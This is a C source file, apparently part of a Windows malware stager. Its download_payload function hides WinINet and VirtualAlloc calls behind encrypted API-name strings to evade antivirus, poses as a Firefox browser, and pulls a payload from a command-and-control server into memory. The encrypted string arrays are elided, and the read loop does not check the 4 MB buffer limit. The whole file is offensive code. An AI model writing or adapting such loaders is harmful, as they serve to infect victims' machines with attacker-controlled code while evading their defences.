#include "config.h"
#include "network.h"
#include "evasion.h"
#include <stdio.h>

// used to cast generic API function pointer (FARPROC)
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

char* download_payload(const char* url, SIZE_T* payload_size) {

    char enc_wininet[] = { /* wininet.dll\0 */ };
    char enc_IntOpen[] = { /* InternetOpenA\0 */ };
    char enc_IntOpenUrl[] = { /* InternetOpenUrlA\0 */ };
    char enc_IntReadFile[] = { /* InternetReadFile\0 */ };
    char enc_IntClose[] = { /* InternetCloseHandle\0 */ };
    char enc_kernel32[] = { /* kernel32.dll\0 */ };
    char enc_VirtAlloc[] = { /* VirtualAlloc\0 */ };
    char enc_VirtFree[] = { /* VirtualFree\0 */ };

    // --- dynamic resolution

    pInternetOpenA fnInternetOpenA = (pInternetOpenA) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntOpen, sizeof(enc_IntOpen), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pInternetOpenUrlA fnInternetOpenUrlA = (pInternetOpenUrlA) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntOpenUrl, sizeof(enc_IntOpenUrl), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pInternetReadFile fnInternetReadFile = (pInternetReadFile) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntReadFile, sizeof(enc_IntReadFile), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pInternetCloseHandle fnInternetCloseHandle = (pInternetCloseHandle) resolve_api(enc_wininet, sizeof(enc_wininet), enc_IntClose, sizeof(enc_IntClose), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtAlloc, sizeof(enc_VirtAlloc), GLOBAL_KEY, GLOBAL_KEY_LEN);
    pVirtualFree fnVirtualFree = (pVirtualFree) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtFree, sizeof(enc_VirtFree), GLOBAL_KEY, GLOBAL_KEY_LEN);

    // if AV blocks a function -> return
    if (!fnInternetOpenA || !fnInternetOpenUrlA || !fnInternetReadFile || !fnInternetCloseHandle || !fnVirtualAlloc || !fnVirtualFree) return NULL;

    // --- download file logic
    
    // act as a legitimate browser (ex. Firefox)
    HINTERNET hInternet = fnInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return NULL;

    // open connection to C2 server
    HINTERNET hUrl = fnInternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        fnInternetCloseHandle(hInternet);
        return NULL;
    }

    // prepare memory buffer to hold payload (4 MB)
    SIZE_T buffer_size = 4 * 1024 * 1024; 
    
    // use dynamically resolved VirtualAlloc
    char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!payload_buffer) {
        fnInternetCloseHandle(hUrl);
        fnInternetCloseHandle(hInternet);
        return NULL;
    }

    DWORD bytes_read = 0;
    DWORD total_bytes_read = 0;

    // --- read file logic
    do {
        if (!fnInternetReadFile(hUrl, payload_buffer + total_bytes_read, 1024, &bytes_read)) {
            break; // reading error
        }
        total_bytes_read += bytes_read;
    } while (bytes_read > 0);

    // clean connections
    fnInternetCloseHandle(hUrl);
    fnInternetCloseHandle(hInternet);

    // if reading fail, clean memory and release buffer
    if (total_bytes_read == 0) {
        // use dynamically resolved VirtualFree
        fnVirtualFree(payload_buffer, 0, MEM_RELEASE);
        return NULL;
    }

    // save payload size
    *payload_size = total_bytes_read;
    return payload_buffer;
    
}